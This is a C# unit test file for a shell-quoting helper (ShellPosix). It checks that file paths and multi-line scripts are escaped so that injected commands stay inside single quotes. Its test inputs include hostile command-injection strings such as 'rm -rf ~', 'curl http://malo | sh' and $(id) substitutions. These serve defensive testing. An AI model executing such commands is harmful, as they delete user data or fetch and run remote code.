using CafManagerConection.UseCases.Abstractions;

namespace CafManagerConection.UseCases.Tests;

public sealed class ShellPosixTests
{
    [Fact]
    public void Una_ruta_normal_queda_entre_comillas_simples()
    {
        Assert.Equal("'/etc/nginx/nginx.conf'",
            ShellPosix.EntreComillas("/etc/nginx/nginx.conf"));
    }

    [Fact]
    public void Una_ruta_con_espacios_queda_en_un_solo_argumento()
    {
        Assert.Equal("'/etc/nginx/sitios disponibles/web.conf'",
            ShellPosix.EntreComillas("/etc/nginx/sitios disponibles/web.conf"));
    }

    [Fact]
    public void Un_texto_vacio_sigue_siendo_un_argumento()
    {
        Assert.Equal("''", ShellPosix.EntreComillas(string.Empty));
    }

    [Fact]
    public void Una_comilla_simple_no_puede_cerrar_el_argumento_y_encadenar_otro_comando()
    {
        var malicioso = "/etc/nginx/x'; rm -rf ~; '.conf";

        var seguro = ShellPosix.EntreComillas(malicioso);

        Assert.Equal("'/etc/nginx/x'\\''; rm -rf ~; '\\''.conf'", seguro);
        Assert.Equal(0, MetacaracteresSueltos(seguro));
    }

    [Theory]
    [InlineData("archivo; reboot")]
    [InlineData("archivo && curl http://malo | sh")]
    [InlineData("archivo`id`")]
    [InlineData("archivo$(id)")]
    [InlineData("a'b'c;d")]
    public void Ningun_metacaracter_del_texto_queda_fuera_de_las_comillas(string texto)
    {
        Assert.Equal(0, MetacaracteresSueltos(ShellPosix.EntreComillas(texto)));
    }

    [Fact]
    public void Un_guion_de_varias_lineas_entra_entero_en_un_solo_comando()
    {
        var guion = "echo 'cmc:resumen'\ndocker inspect web\ndocker logs --tail 40 web";

        var envuelto = ShellPosix.ComoUnSoloComando(guion);

        Assert.StartsWith("sh -c '", envuelto, StringComparison.Ordinal);
        Assert.EndsWith("'", envuelto, StringComparison.Ordinal);

        Assert.Contains("docker logs --tail 40 web", envuelto, StringComparison.Ordinal);
        Assert.Equal(0, MetacaracteresSueltos(envuelto));
    }

    private static int MetacaracteresSueltos(string comando)
    {
        var dentro = false;
        var sueltos = 0;

        for (var i = 0; i < comando.Length; i++)
        {
            var c = comando[i];

            if (!dentro && c == '\\')
            {
                i++;
                continue;
            }

            if (c == '\'')
            {
                dentro = !dentro;
            }
            else if (!dentro && c is ';' or '&' or '|' or '`' or '$')
            {
                sueltos++;
            }
        }

        return sueltos;
    }
}
